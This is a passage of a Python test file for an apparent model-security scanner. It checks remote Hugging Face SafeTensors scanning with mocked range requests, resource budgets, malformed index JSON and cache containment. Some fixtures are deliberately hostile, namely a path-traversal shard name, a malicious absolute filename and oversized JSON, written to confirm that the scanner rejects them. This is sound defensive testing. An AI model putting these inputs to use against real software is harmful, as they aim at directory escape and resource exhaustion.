                        scannable_filenames=set(),
                        scannable_scanner_ids={"safetensors"},
                        _include_scan_results=True,
                    )
                )
                source_results = [item[2] for item in streamed]
                aggregate = scan_model_streaming(
                    iter(streamed),
                    timeout=60,
                    delete_after_scan=False,
                    cache_enabled=True,
                    scanners=["safetensors"],
                    skip_file_types=False,
                )
                after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

            serialized_aggregate = aggregate.model_dump_json()
            budget_results = [
                result
                for result in source_results
                if _HF_SAFETENSORS_RESULT_BUDGET_REASON in result.metadata.get("scan_outcome_reasons", [])
            ]
            source_paths = {result.metadata["source_path"] for result in source_results}
            scale = 1 if sys.platform == "darwin" else 1024
            print(
                json.dumps(
                    {
                        "streamed_results": len(streamed),
                        "files_scanned": aggregate.files_scanned,
                        "range_requests": mock_get.call_count,
                        "download_calls": mock_download.call_count,
                        "cache_store_calls": mock_cache_store.call_count,
                        "scan_file_calls": mock_scan_file.call_count,
                        "budget_results": len(budget_results),
                        "budget_checks": sum(
                            check.name == "Hugging Face SafeTensors Retained Result Budget"
                            for result in source_results
                            for check in result.checks
                        ),
                        "index_scope_results": sum(
                            result.metadata.get("analysis_scope") == "safetensors_index_reconciliation"
                            for result in source_results
                        ),
                        "header_scope_results": sum(
                            result.metadata.get("analysis_scope") == "safetensors_header_and_metadata"
                            for result in source_results
                        ),
                        "source_native_metadata": set(aggregate.file_metadata) == source_paths,
                        "source_result_bytes": sum(result.bytes_scanned for result in source_results),
                        "bytes_scanned": aggregate.bytes_scanned,
                        "has_errors": aggregate.has_errors,
                        "success": aggregate.success,
                        "exit_code": determine_exit_code(aggregate),
                        "content_hash": aggregate.content_hash,
                        "serialized_bytes": len(serialized_aggregate.encode()),
                        "huge_header_bytes": len(header_bytes) if huge_name is not None else None,
                        "huge_name_retained": huge_name in serialized_aggregate if huge_name is not None else None,
                        "peak_delta_bytes": (after - before) * scale,
                        "last_path": str(Path(streamed[-1][0])),
                        "last_is_last": bool(streamed[-1][1]),
                        "last_marker_count": sum(bool(item[1]) for item in streamed),
                        "last_result_success": source_results[-1].success,
                        "budget_filename": (
                            budget_results[0].metadata.get("hf_filename") if budget_results else None
                        ),
                        "budget_is_index_only": (
                            budget_results[0].metadata.get("remote_index_only") if budget_results else None
                        ),
                        "budget_has_header_only": (
                            "remote_header_only" in budget_results[0].metadata if budget_results else None
                        ),
                        "budget_index_reason": (
                            budget_results[0]
                            .metadata.get("remote_index_reconciliation", {})
                            .get("index_incomplete_reason")
                            if budget_results
                            else None
                        ),
                        "budget_details": (
                            budget_results[0].metadata.get("remote_result_retention_budget")
                            if budget_results
                            else None
                        ),
                    }
                )
            )
            """
        )
        env = {**os.environ, "PYTHONPATH": str(repo_root), "PROMPTFOO_DISABLE_TELEMETRY": "1"}

        completed = subprocess.run(
            [sys.executable, "-c", script, str(malformed_index_count)],
            check=False,
            capture_output=True,
            env=env,
            text=True,
            timeout=60,
        )
        assert completed.returncode == 0, completed.stderr
        metrics = json.loads(completed.stdout.strip().splitlines()[-1])

        expected_results = min(malformed_index_count + 1, _MAX_HF_SAFETENSORS_RETAINED_RESULTS)
        expected_range_requests = (
            _MAX_HF_SAFETENSORS_RETAINED_RESULTS
            if expected_budget_scope == "index"
            else malformed_index_count
            if expected_budget_scope == "header"
            else malformed_index_count + 2
        )
        assert metrics["streamed_results"] == expected_results
        assert metrics["files_scanned"] == expected_results
        assert metrics["range_requests"] == expected_range_requests
        assert metrics["download_calls"] == 0
        assert metrics["cache_store_calls"] == 0
        assert metrics["scan_file_calls"] == 0
        assert metrics["source_native_metadata"] is True
        assert metrics["bytes_scanned"] == metrics["source_result_bytes"]
        assert metrics["has_errors"] is True
        assert metrics["success"] is False
        assert metrics["exit_code"] == 2
        assert metrics["content_hash"] is None
        assert metrics["serialized_bytes"] < _MAX_HF_SAFETENSORS_RETAINED_RESULT_BYTES
        assert metrics["peak_delta_bytes"] < 64 * 1024 * 1024
        assert metrics["last_is_last"] is True
        assert metrics["last_marker_count"] == 1

        if expected_budget_scope is not None:
            assert metrics["budget_results"] == 1
            assert metrics["budget_checks"] == 1
            assert metrics["last_result_success"] is False
            assert metrics["budget_filename"] == metrics["last_path"]
            assert metrics["budget_details"]["exceeded"] == ["result_count"]
            assert metrics["budget_details"]["retained_results"] == expected_results - 1
            assert metrics["budget_details"]["projected_results"] == expected_results
            if expected_budget_scope == "index":
                assert metrics["index_scope_results"] == expected_results
                assert metrics["header_scope_results"] == 0
                assert metrics["last_path"] == "broken-0511.safetensors.index.json"
                assert metrics["budget_is_index_only"] is True
                assert metrics["budget_has_header_only"] is False
                assert metrics["budget_index_reason"] == "index_read_or_parse_failed"
            else:
                assert metrics["index_scope_results"] == malformed_index_count
                assert metrics["header_scope_results"] == 1
                assert metrics["last_path"] == "weights.safetensors"
                assert metrics["budget_is_index_only"] is None
                assert metrics["budget_has_header_only"] is True
                assert metrics["budget_index_reason"] is None
                assert metrics["budget_details"]["candidate_scan_preflighted"] is True
                assert metrics["huge_header_bytes"] > 6_000_000
                assert metrics["huge_name_retained"] is False
        else:
            assert metrics["budget_results"] == 0
            assert metrics["budget_checks"] == 0
            assert metrics["index_scope_results"] == malformed_index_count
            assert metrics["header_scope_results"] == 1
            assert metrics["last_path"] == "weights.safetensors"
            assert metrics["last_result_success"] is True
            assert metrics["budget_details"] is None

    @pytest.mark.skipif(os.name == "nt", reason="resource peak RSS is unavailable on Windows")
    def test_remote_safetensors_max_cardinality_repository_retention_is_measured_and_bounded(self) -> None:
        """One hundred maximum-cardinality headers must stop at the aggregate retention cap."""
        repo_root = Path(__file__).resolve().parents[3]
        script = textwrap.dedent(
            """
            import json
            import os
            import resource
            import struct
            import sys
            from unittest.mock import patch

            from modelaudit.core import determine_exit_code, scan_model_streaming
            from modelaudit.utils.sources.huggingface import download_model_streaming

            revision = "a" * 40
            filenames = [f"model-{index:05d}-of-00100.safetensors" for index in range(1, 101)]
            header = {
                f"tensor_{index:04d}": {"dtype": "U8", "shape": [1], "data_offsets": [index, index + 1]}
                for index in range(4096)
            }
            header_bytes = json.dumps(header, separators=(",", ":")).encode()
            frame = struct.pack("<Q", len(header_bytes)) + header_bytes + (b"\\x00" * 4096)

            class Response:
                def __init__(self, payload, start):
                    self.payload = payload
                    self.status_code = 206
                    self.url = "https://huggingface.co/test/model/resolve/" + revision + "/file"
                    self.headers = {
                        "Content-Range": f"bytes {start}-{start + len(payload) - 1}/{len(frame)}",
                        "Content-Length": str(len(payload)),
                        "ETag": '"stable"',
                    }

                def __enter__(self):
                    return self

                def __exit__(self, *_args):
                    return None

                def raise_for_status(self):
                    return None

                def close(self):
                    return None

                def iter_content(self, chunk_size):
                    for start in range(0, len(self.payload), chunk_size):
                        yield self.payload[start : start + chunk_size]

            def range_response(_url, *, headers, **_kwargs):
                start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
                start = int(start_text)
                end = min(int(end_text), len(frame) - 1)
                return Response(frame[start : end + 1], start)

            with (
                patch(
                    "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                    return_value=(filenames, revision, None),
                ),
                patch(
                    "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
                    return_value=(dict.fromkeys(filenames, len(frame)), revision),
                ),
                patch(
                    "huggingface_hub.utils.build_hf_headers",
                    side_effect=lambda *, token=None, headers=None: headers or {},
                ),
                patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/file"),
                patch("huggingface_hub.hf_hub_download") as mock_download,
                patch("requests.get", side_effect=range_response),
            ):
                before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
                result = scan_model_streaming(
                    download_model_streaming(
                        f"hf://test/model?revision={revision}",
                        max_size=64 * 1024 * 1024,
                        scannable_extensions={".safetensors"},
                        scannable_scanner_ids={"safetensors"},
                        _include_scan_results=True,
                    ),
                    timeout=60,
                    delete_after_scan=False,
                    cache_enabled=False,
                    scanners=["safetensors"],
                    skip_file_types=False,
                )
                after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

            dumped = result.model_dump(mode="json")
            budget = next(
                (
                    metadata["remote_result_retention_budget"]
                    for metadata in dumped["file_metadata"].values()
                    if "remote_result_retention_budget" in metadata
                ),
                None,
            )
            scale = 1 if sys.platform == "darwin" else 1024
            print(
                json.dumps(
                    {
                        "files_scanned": result.files_scanned,
                        "download_calls": mock_download.call_count,
                        "success": result.success,
                        "exit_code": determine_exit_code(result),
                        "retained_tensor_names": sum(
                            len(asset.get("tensors") or []) for asset in dumped["assets"]
                        ),
                        "serialized_bytes": len(result.model_dump_json().encode()),
                        "peak_delta_bytes": (after - before) * scale,
                        "header_bytes": len(header_bytes),
                        "budget": budget,
                    }
                )
            )
            """
        )
        env = {**os.environ, "PYTHONPATH": str(repo_root), "PROMPTFOO_DISABLE_TELEMETRY": "1"}

        completed = subprocess.run(
            [sys.executable, "-c", script],
            check=False,
            capture_output=True,
            env=env,
            text=True,
            timeout=60,
        )
        assert completed.returncode == 0, completed.stderr
        metrics = json.loads(completed.stdout.strip().splitlines()[-1])

        assert metrics["files_scanned"] == 65
        assert metrics["download_calls"] == 0
        assert metrics["success"] is False
        assert metrics["exit_code"] == 2
        assert metrics["retained_tensor_names"] == _MAX_HF_SAFETENSORS_RETAINED_TENSOR_NAMES
        assert metrics["serialized_bytes"] < _MAX_HF_SAFETENSORS_RETAINED_RESULT_BYTES
        assert metrics["peak_delta_bytes"] < 64 * 1024 * 1024
        assert metrics["header_bytes"] > 250_000
        assert metrics["budget"]["exceeded"] == ["tensor_name_count"]
        assert metrics["budget"]["retained_results"] < _MAX_HF_SAFETENSORS_RETAINED_RESULTS

    def test_remote_safetensors_zero_based_index_is_authoritative(self) -> None:
        first = "model-00000-of-00002.safetensors"
        second = "model-00001-of-00002.safetensors"
        filename_details = _remote_safetensors_filename_shard_details_by_file(
            [first, second],
            [first, second],
        )
        index_details = {
            filename: {
                "complete": True,
                "index_complete": True,
                "index_referenced_by_manifest": True,
            }
            for filename in (first, second)
        }

        combined = _combine_remote_safetensors_shard_details(filename_details, index_details)

        assert combined[first]["filename_pattern_complete"] is False
        assert combined[first]["complete"] is True
        assert combined[second]["complete"] is True

    def test_remote_safetensors_index_cannot_override_missing_canonical_shard(self) -> None:
        first = "model-00001-of-00002.safetensors"
        filename_details = _remote_safetensors_filename_shard_details_by_file([first], [first])
        index_details = {
            first: {
                "complete": True,
                "index_complete": True,
                "index_referenced_by_manifest": True,
            }
        }

        combined = _combine_remote_safetensors_shard_details(filename_details, index_details)

        assert combined[first]["filename_pattern_authoritative"] is True
        assert combined[first]["filename_pattern_complete"] is False
        assert combined[first]["complete"] is False

    def test_safetensors_index_duplicate_key_count_is_not_sample_count(self) -> None:
        pairs = ",".join(f'"tensor_{index}":0,"tensor_{index}":1' for index in range(25))

        (
            parsed,
            duplicate_keys,
            duplicate_key_count,
            _duplicate_key_utf8_bytes,
            _duplicate_key_preview_truncated_count,
            parse_error,
        ) = _loads_json_without_duplicate_keys(f"{{{pairs}}}".encode())

        assert isinstance(parsed, dict)
        assert parse_error is None
        assert duplicate_key_count == 25
        assert len(duplicate_keys) == 20

    def test_safetensors_index_duplicate_key_preview_is_utf8_bounded(self) -> None:
        duplicate_name = "界" * 1000
        raw = f'{{"{duplicate_name}":0,"{duplicate_name}":1}}'.encode()

        (
            parsed,
            duplicate_keys,
            duplicate_key_count,
            duplicate_key_utf8_bytes,
            duplicate_key_preview_truncated_count,
            parse_error,
        ) = _loads_json_without_duplicate_keys(raw)

        assert isinstance(parsed, dict)
        assert parse_error is None
        assert duplicate_key_count == 1
        assert duplicate_key_utf8_bytes == len(duplicate_name.encode())
        assert duplicate_key_preview_truncated_count == 1
        assert len(duplicate_keys) == 1
        assert len(duplicate_keys[0].encode()) <= 256
        assert duplicate_name not in duplicate_keys[0]

    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_safetensors_index_invalid_entry_preview_is_utf8_bounded(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
    ) -> None:
        index_name = "model.safetensors.index.json"
        shard_name = "model.safetensors"
        invalid_name = "界" * 1000
        payload = json.dumps({"weight_map": {invalid_name: "../escape.safetensors"}}).encode()
        mock_hf_hub_url.return_value = f"https://huggingface.co/test/model/resolve/{_HF_TEST_REVISION}/{index_name}"
        mock_requests_get.return_value = _strict_range_response(payload, len(payload))

        details, transferred, acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [shard_name],
            [index_name, shard_name],
            _HF_TEST_REVISION,
            {index_name: len(payload), shard_name: 128},
            deadline=None,
            max_transferred_bytes=None,
        )

        assert transferred == len(payload)
        assert acquired_indexes == {index_name: payload}
        assert unscoped_failures == {}
        invalid_entries = details[shard_name]["index_invalid_entries"]
        assert len(invalid_entries) == 1
        assert len(invalid_entries[0].encode()) < 512
        assert invalid_name not in invalid_entries[0]
        assert details[shard_name]["index_tensor_name_utf8_bytes"] == len(invalid_name.encode())

    def test_safetensors_index_container_graph_is_bounded_before_parse(self) -> None:
        raw = b'{"metadata":[' + (b"null," * 504_096) + b'null],"weight_map":{}}'

        (
            parsed,
            duplicate_keys,
            duplicate_key_count,
            _duplicate_key_utf8_bytes,
            _duplicate_key_preview_truncated_count,
            parse_error,
        ) = _loads_json_without_duplicate_keys(raw)

        assert parsed is None
        assert duplicate_keys == []
        assert duplicate_key_count == 0
        assert parse_error is not None
        assert "JSON object/value limit" in parse_error

    def test_safetensors_index_string_content_does_not_count_as_structure(self) -> None:
        raw = json.dumps(
            {"metadata": {"note": '":' * 100_001}, "weight_map": {"tensor": "model.safetensors"}},
            separators=(",", ":"),
        ).encode()

        (
            parsed,
            duplicate_keys,
            duplicate_key_count,
            _duplicate_key_utf8_bytes,
            _duplicate_key_preview_truncated_count,
            parse_error,
        ) = _loads_json_without_duplicate_keys(raw)

        assert isinstance(parsed, dict)
        assert duplicate_keys == []
        assert duplicate_key_count == 0
        assert parse_error is None

    def test_strict_range_rejects_empty_quoted_etag(self) -> None:
        with pytest.raises(ValueError, match="empty object validator"):
            _range_response_validator({"ETag": '""'})

    @patch("huggingface_hub.utils.build_hf_headers")
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_strict_range_deadline_closes_stalled_body(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        mock_build_headers: MagicMock,
    ) -> None:
        import threading

        class StalledResponse(_FakeRangeResponse):
            def __init__(self) -> None:
                super().__init__(
                    b"12345678",
                    headers={
                        "Content-Range": "bytes 0-7/8",
                        "Content-Length": "8",
                        "ETag": '"stable"',
                    },
                    status_code=206,
                )
                self.closed = threading.Event()

            def close(self) -> None:
                self.closed.set()

            def iter_content(self, chunk_size: int) -> Iterator[bytes]:
                self.closed.wait(timeout=1.0)
                yield from ()

        response = StalledResponse()
        mock_requests_get.return_value = response
        mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        started = time.monotonic()

        with pytest.raises(RuntimeError, match="ended before declared range"):
            _read_huggingface_strict_range(
                "test/model",
                "model.safetensors",
                _HF_TEST_REVISION,
                8,
                expected_size=8,
                deadline=time.monotonic() + 0.05,
            )

        assert response.closed.is_set()
        assert time.monotonic() - started < 0.5

    @patch("huggingface_hub.utils.build_hf_headers")
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_remote_safetensors_index_tensor_assignment_mismatch_fails_closed(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        mock_build_headers: MagicMock,
    ) -> None:
        frame, _header_len = _make_safetensors_frame(
            {"actual": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"data",
        )
        mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}

        def range_response(_url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            return _strict_range_response(frame[start : end + 1], len(frame), start_offset=start)

        mock_requests_get.side_effect = range_response

        result = _scan_remote_huggingface_safetensors_header(
            "test/model",
            "model.safetensors",
            _HF_TEST_REVISION,
            declared_size=len(frame),
            deadline=None,
            shard_details={
                "complete": True,
                "index_complete": True,
                "index_referenced_by_manifest": True,
                "index_tensor_names_digest": _tensor_name_digest(["expected"]),
            },
            active_scanner_ids={"safetensors"},
        )

        assert result.success is False
        assert result.metadata["remote_shard_family"]["index_incomplete_reason"] == ("index_tensor_assignment_mismatch")
        assert "remote_safetensors_shard_coverage_incomplete" in result.metadata["scan_outcome_reasons"]

    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_disjoint_safetensors_indexes_do_not_poison_each_other(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
    ) -> None:
        first_shard = "first.safetensors"
        second_shard = "second.safetensors"
        first_index = "first.safetensors.index.json"
        second_index = "second.safetensors.index.json"
        first_payload = json.dumps({"weight_map": {"first": first_shard}}, separators=(",", ":")).encode()
        second_payload = json.dumps({"weight_map": {"second": second_shard}}, separators=(",", ":")).encode()
        repo_files = [first_index, second_index, first_shard, second_shard]
        path_sizes: dict[str, int | None] = {
            first_index: len(first_payload),
            second_index: len(second_payload),
            first_shard: 128,
            second_shard: 128,
        }
        mock_hf_hub_url.side_effect = lambda *, repo_id, filename, revision: (
            f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
        )
        mock_requests_get.side_effect = [
            _strict_range_response(first_payload, len(first_payload)),
            _strict_range_response(second_payload, len(second_payload)),
        ]

        details, _bytes_transferred, _transferred_indexes, unscoped_failures = (
            _remote_safetensors_index_details_by_file(
                "test/model",
                [first_shard, second_shard],
                repo_files,
                _HF_TEST_REVISION,
                path_sizes,
                deadline=None,
                max_transferred_bytes=None,
            )
        )

        assert unscoped_failures == {}
        assert details[first_shard]["index_complete"] is True
        assert details[first_shard]["index_manifest"] == first_index
        assert details[second_shard]["index_complete"] is True
        assert details[second_shard]["index_manifest"] == second_index

    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_duplicate_top_level_weight_maps_retain_every_shard_reference(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
    ) -> None:
        """An overwritten top-level weight_map cannot leave its referenced shard clean."""
        index_name = "model.safetensors.index.json"
        first_shard = "experts/alpha.safetensors"
        second_shard = "experts/beta.safetensors"
        index_payload = (
            b'{"weight_map":{"alpha":"experts/alpha.safetensors"},"weight_map":{"beta":"experts/beta.safetensors"}}'
        )
        mock_hf_hub_url.return_value = f"https://huggingface.co/test/model/resolve/{_HF_TEST_REVISION}/{index_name}"
        mock_requests_get.return_value = _strict_range_response(index_payload, len(index_payload))

        details, transferred, acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [first_shard, second_shard],
            [index_name, first_shard, second_shard],
            _HF_TEST_REVISION,
            {
                index_name: len(index_payload),
                first_shard: 128,
                second_shard: 128,
            },
            deadline=None,
            max_transferred_bytes=None,
        )

        assert transferred == len(index_payload)
        assert acquired_indexes == {index_name: index_payload}
        assert unscoped_failures == {}
        assert details[first_shard]["index_complete"] is False
        assert details[second_shard]["index_complete"] is False
        assert details[first_shard]["index_weight_map_tensor_count"] == 2
        assert details[second_shard]["index_duplicate_json_keys"] == ["weight_map"]

    @pytest.mark.parametrize(
        "index_payload",
        [
            b'{"weight_map":{"alpha":"experts/alpha.safetensors"},"weight_map":null}',
            b'{"weight_map":null,"weight_map":{"alpha":"experts/alpha.safetensors"}}',
        ],
        ids=["valid-then-non-object", "non-object-then-valid"],
    )
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_duplicate_top_level_weight_map_non_object_retains_valid_references(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        index_payload: bytes,
    ) -> None:
        """A malformed duplicate cannot hide arbitrary shards referenced by a valid map."""
        index_name = "model.safetensors.index.json"
        shard_name = "experts/alpha.safetensors"
        mock_hf_hub_url.return_value = f"https://huggingface.co/test/model/resolve/{_HF_TEST_REVISION}/{index_name}"
        mock_requests_get.return_value = _strict_range_response(index_payload, len(index_payload))

        details, transferred, acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [shard_name],
            [index_name, shard_name],
            _HF_TEST_REVISION,
            {index_name: len(index_payload), shard_name: 128},
            deadline=None,
            max_transferred_bytes=None,
        )

        assert transferred == len(index_payload)
        assert acquired_indexes == {index_name: index_payload}
        assert unscoped_failures == {}
        assert details[shard_name]["index_complete"] is False
        assert details[shard_name]["index_referenced_by_manifest"] is True
        assert details[shard_name]["index_weight_map_tensor_count"] == 1
        assert details[shard_name]["index_invalid_entry_count"] == 1
        assert details[shard_name]["index_invalid_entries"] == ["weight_map occurrence is not a JSON object"]

    def test_private_acquired_index_path_is_windows_safe_and_filename_independent(self) -> None:
        private_root = PureWindowsPath("C:/private/modelaudit_hf_index_1234")
        malicious_name = "D:/nested/model.safetensors.index.json"

        with pytest.raises(ValueError, match="unsafe repository filename"):
            _validate_huggingface_repo_filename("attacker/repo", malicious_name)
        with pytest.raises(ValueError, match="unsafe repository filename"):
            _private_huggingface_acquired_index_candidate(private_root, "attacker/repo", malicious_name)

        nested_name = "nested/model.safetensors.index.json"
        candidate = _private_huggingface_acquired_index_candidate(private_root, "test/model", nested_name)

        assert candidate == private_root / _HF_ACQUIRED_SAFETENSORS_INDEX_BASENAME
        assert candidate.is_relative_to(private_root)
        assert nested_name not in str(candidate)

    @pytest.mark.parametrize(
        ("budget_adjustment", "expected_success"),
        [(0, True), (-1, False)],
        ids=["exact-budget", "one-byte-over-budget"],
    )
    @pytest.mark.parametrize("use_cache_root", [False, True], ids=["ephemeral", "scan-root-contained"])
    @pytest.mark.parametrize("nested", [False, True], ids=["root-index", "nested-index"])
    def test_download_model_streaming_counts_selected_safetensors_index_once(
        self,
        budget_adjustment: int,
        expected_success: bool,
        use_cache_root: bool,
        nested: bool,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A default-selected index is charged once after reconciliation reads it."""
        parent_prefix = "nested/" if nested else ""
        index_name = f"{parent_prefix}model.safetensors.index.json"
        shard_name = f"{parent_prefix}model.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        index_payload = json.dumps(
            {"weight_map": {"tensor": PurePosixPath(shard_name).name}},
            separators=(",", ":"),
        ).encode()
        repo_files = [index_name, shard_name]
        payloads = {index_name: index_payload, shard_name: frame}
        max_size = len(index_payload) + 16 + header_len + budget_adjustment
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        path_sizes = {index_name: len(index_payload), shard_name: len(frame)}

        def get_path_sizes(
            _repo_id: str,
            filenames: list[str],
            **_kwargs: object,
        ) -> tuple[dict[str, int], str]:
            return {filename: path_sizes[filename] for filename in filenames}, _HF_TEST_REVISION

        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            get_path_sizes,
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            lambda *_args, **_kwargs: "safetensors",
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            filename = index_name if index_name in url else shard_name
            payload = payloads[filename]
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(payload) - 1)
            return _strict_range_response(
                payload[start : end + 1],
                len(payload),
                start_offset=start,
                url=url,
            )

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            cache_dir = tmp_path / "cache" if use_cache_root else None
            canonical_index_path: Path | None = None
            if cache_dir is not None:
                canonical_index_path = (cache_dir / "huggingface" / "test" / "model").joinpath(
                    *PurePosixPath(index_name).parts
                )
                canonical_index_path.parent.mkdir(parents=True)
                canonical_index_path.write_bytes(b"existing cache sentinel")
            stream = download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                cache_dir=cache_dir,
                max_size=max_size,
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
            index_result = next(stream)
            acquired_index_path = index_result[0]
            assert acquired_index_path.name == _HF_ACQUIRED_SAFETENSORS_INDEX_BASENAME
            assert index_name not in acquired_index_path.as_posix()
            assert acquired_index_path.read_bytes() == index_payload
            index_accounting = cast(tuple[Path, bool, None, StreamedSourceByteAccounting], index_result)[3]
            remote_index_source = f"hf://test/model@{_HF_TEST_REVISION}/{index_name}"
            assert index_accounting.source_path == remote_index_source
            if cache_dir is not None:
                scan_root = (cache_dir / "huggingface").resolve()
                assert acquired_index_path.resolve().is_relative_to(scan_root)
                assert acquired_index_path != canonical_index_path
                assert canonical_index_path is not None
                assert canonical_index_path.read_bytes() == b"existing cache sentinel"
                contained_result = scan_model_streaming(
                    iter([index_result]),
                    scan_root=str(scan_root),
                    delete_after_scan=False,
                    cache_enabled=False,
                    scanners=["metadata"],
                    skip_file_types=False,
                )
                assert not [issue for issue in contained_result.issues if "path traversal" in issue.message.lower()]
                assert remote_index_source in contained_result.file_metadata
                assert str(acquired_index_path) not in contained_result.file_metadata
            shard_result = next(stream)
            with pytest.raises(StopIteration):
                next(stream)
            closed_index_path: Path | None = None
            if cache_dir is not None:
                close_stream = download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    cache_dir=cache_dir,
                    max_size=max_size,
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
                closed_index_path = next(close_stream)[0]
                assert closed_index_path.exists()
                close_method = getattr(close_stream, "close", None)
                assert callable(close_method)
                close_method()

        assert not acquired_index_path.exists()
        if closed_index_path is not None:
            assert not closed_index_path.exists()
        if canonical_index_path is not None:
            assert canonical_index_path.read_bytes() == b"existing cache sentinel"
        _path, _is_last, scan_result = cast(tuple[Path, bool, Any], shard_result)
        assert scan_result.success is expected_success
        if expected_success:
            assert scan_result.metadata["remote_bytes_transferred"] == 16 + header_len
        else:
            assert "remote_safetensors_header_max_size_exceeded" in scan_result.metadata["scan_outcome_reasons"]
        mock_download.assert_not_called()

    def test_selected_failed_safetensors_index_is_counted_once_downstream(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A selected acquired index is charged once even when only SafeTensors is active."""
        index_name = "model.safetensors.index.json"
        shard_name = "experts/alpha.safetensors"
        index_payload = b"{" + (b"!" * 39)
        frame, header_len = _make_safetensors_frame(
            {"a": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        assert len(index_payload) == 40
        assert 16 + header_len == 69
        payloads = {index_name: index_payload, shard_name: frame}
        repo_files = [index_name, shard_name]
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {filename: len(payload) for filename, payload in payloads.items()},
                _HF_TEST_REVISION,
            ),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            filename = index_name if index_name in url else shard_name
            payload = payloads[filename]
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(payload) - 1)
            return _strict_range_response(
                payload[start : end + 1],
                len(payload),
                start_offset=start,
                url=url,
            )

        streamed_items: list[
            tuple[Path, bool] | tuple[Path, bool, Any] | tuple[Path, bool, Any | None, StreamedSourceByteAccounting]
        ] = []

        def tracked_stream() -> Iterator[
            tuple[Path, bool] | tuple[Path, bool, Any] | tuple[Path, bool, Any | None, StreamedSourceByteAccounting]
        ]:
            for item in download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            ):
                streamed_items.append(item)
                yield item

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            expected_bytes = 109
            aggregate = scan_model_streaming(
                tracked_stream(),
                timeout=30,
                delete_after_scan=False,
                cache_enabled=False,
                scanners=["safetensors"],
                skip_file_types=False,
                max_total_size=expected_bytes,
            )

        first_item = cast(tuple[Path, bool, Any, StreamedSourceByteAccounting], streamed_items[0])
        failure_result = first_item[2]
        assert failure_result.bytes_scanned == len(index_payload)
        assert failure_result.metadata["remote_bytes_transferred"] == len(index_payload)
        assert first_item[3] == StreamedSourceByteAccounting(
            pretransferred_bytes=len(index_payload),
            source_bytes_preaccounted=len(index_payload),
        )
        selected_index_item = cast(
            tuple[Path, bool, None, StreamedSourceByteAccounting],
            streamed_items[1],
        )
        assert selected_index_item[3] == StreamedSourceByteAccounting(
            source_bytes_preaccounted=len(index_payload),
            source_path=f"hf://test/model@{_HF_TEST_REVISION}/{index_name}",
        )
